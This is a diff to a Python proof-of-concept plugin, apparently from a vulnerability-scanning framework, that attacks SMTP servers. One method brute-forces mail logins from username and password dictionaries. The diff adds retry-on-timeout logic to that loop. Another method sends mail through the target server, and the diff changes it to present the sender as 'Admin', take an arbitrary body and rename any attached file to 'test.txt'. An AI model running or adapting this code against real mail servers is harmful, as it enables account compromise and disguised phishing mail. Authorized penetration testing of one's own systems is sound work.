@@ -18,6 +18,7 @@ class POC(Script):
 
     def prove(self):
         if _socket_connect(self.target_host, self.target_port):
+            flag = 3
             usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
                 'dict/smtp_usernames.txt')
             passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
@@ -31,12 +32,12 @@ class POC(Script):
                 for linef2 in passworddic:
                     password = linef2.replace("%user%", username).strip('\r').strip('\n').replace("@%host%", '')
                     try:
+                        socket.setdefaulttimeout(5)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.setdefaulttimeout(3)
                         s.connect((self.target_host, self.target_port))
                         banner = str(s.recv(1024))
                         emailaddress = '.'.join(self.target_host.split('.')[1:])
-                        # print(banner)
+                        # print(username1,password)
                         if "220" in banner:
                             s.send(bytes('HELO mail.' + emailaddress + ' \r\n', 'utf-8'))
                             helo = str(s.recv(1024))
@@ -62,9 +63,11 @@ class POC(Script):
 
                         else:
                             return
-                    except:
-                        pass
-
+                    except Exception as e:
+                        if "timed out" in str(e):
+                            if flag == 0 :
+                                return
+                            flag -= 1
 
     def exec(self):
         if _socket_connect(self.target_host, self.target_port):
@@ -80,16 +83,16 @@ class POC(Script):
             sender = self.parameter['s']
             receivers = self.parameter['r'].split(',')
             filename = self.parameter['f']
+            content = self.parameter['c']
             mail_host = self.target_host
             mail_port = self.target_port
-            timeout = int(3)
             content = '''
             Helo,
-                This is a test.
+                %s 
                                                                                         —— by Tester
-            '''
+            ''' % content
             message = MIMEMultipart()
-            message['From'] = "submon<%s>" % sender
+            message['From'] = "Admin<%s>" % sender
             message['To'] = ','.join(receivers)
             message['Subject'] = Header(filename, 'utf-8')
             message.attach(MIMEText(content, 'plain', 'utf-8'))
@@ -97,14 +100,14 @@ class POC(Script):
             with open(os.path.join(filename), 'rb') as f:
                 att = MIMEText(f.read(), 'base64', 'utf-8')
                 att["Content-Type"] = 'application/octet-stream'
-                att.add_header("Content-Disposition", "attachment", filename=("utf-8", "", filename))
+                att.add_header("Content-Disposition", "attachment", filename=("utf-8", "", 'test.txt'))
                 message.attach(att)
 
             n = 3
             while n > 0:
                 try:
-                    socket.setdefaulttimeout(timeout)
-                    if self.target_port == '465':
+                    socket.setdefaulttimeout(5)
+                    if self.target_port == 465:
                         smtpObj = smtplib.SMTP_SSL()
                     else:
                         smtpObj = smtplib.SMTP()
@@ -128,10 +131,9 @@ class POC(Script):
 
 def _socket_connect(ip, port,msg = "test"):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
+    try:      
         s.connect((ip, port))
         s.sendall(bytes(msg, 'utf-8'))
-        message = str(s.recv(1024))
         s.close()
         return True
     except:
